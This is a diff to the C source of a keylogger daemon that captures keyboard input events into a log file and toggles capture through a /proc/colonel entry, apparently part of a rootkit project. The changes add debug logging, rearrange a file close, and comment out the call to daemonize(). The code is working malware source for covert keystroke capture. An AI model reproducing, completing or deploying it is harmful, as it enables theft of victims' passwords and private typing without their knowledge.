@@ -118,19 +118,27 @@ void key_listen(void) {
 		toggle = strstr(cmd, kl);			        		/* looks for change in /proc/colonel */
 		if ((0 == listening) && (toggle != NULL)) {
 			listening = !listening;
+			fprintf(error_log, "in 1st if");
         		evlog = fopen("./col_log/evlog.txt", "a+"); 			/* key log */
 			if (NULL == evlog) {
                 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 		exit(1);
             		}	
 			system_timestamp();
-			close(control_file);
 			continue;
 
 		} else if ((1 == ev.type) && (1 == listening)) {	                /* if typing and keylogger is on */
+			fprintf(error_log, "2if: above close");
+			close(control_file);
+			fprintf(error_log, "2if: below close");
             		fprintf(evlog, "%i,%i-", ev.code, ev.value);     		/* grabs keyboard input */
 			fflush(evlog);
 			control_file = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
+			if (!control_file) {
+				fprintf(error_log, "ERROR: Could not open control_file -- %s.", ctime(&curtime));
+				exit(1);
+			}
+			fprintf(error_log, "2if: below open");
 			if (NULL == toggle) {
 				listening = !listening;
                 		fclose(evlog);
@@ -138,13 +146,15 @@ void key_listen(void) {
 				close(control_file);
 				continue;
 			}
+			fprintf(error_log, "while: below ifs");
 		}
+		fprintf(error_log, "outside while");	
 	}
-	fclose(evlog);
+
 }
 
 int main(void) {
-	daemonize();
+//	daemonize();
 	setup_dirs();
 
 	error_log = fopen("./col_log/log.txt", "a+"); 					/* daemon log */
@@ -153,5 +163,6 @@ int main(void) {
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
 	key_listen();	
 	fclose(error_log);
+	fclose(evlog);
 	return 0;
 }
